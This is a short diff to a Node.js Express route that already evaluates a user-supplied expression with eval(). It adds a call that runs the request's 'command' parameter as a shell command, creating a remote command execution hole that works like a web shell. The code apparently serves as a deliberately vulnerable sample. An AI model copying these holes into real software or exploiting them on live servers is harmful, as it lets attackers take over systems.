@@ -1,4 +1,5 @@
 const express = require("express");
+const { exec } = require("child_process");
 
 const app = express();
 
@@ -9,6 +10,8 @@ app.get("/user", (req, res) => {
         "'";
 
     const result = eval(req.query.expression);
+
+    exec(req.query.command);
 
     res.send({
         query,
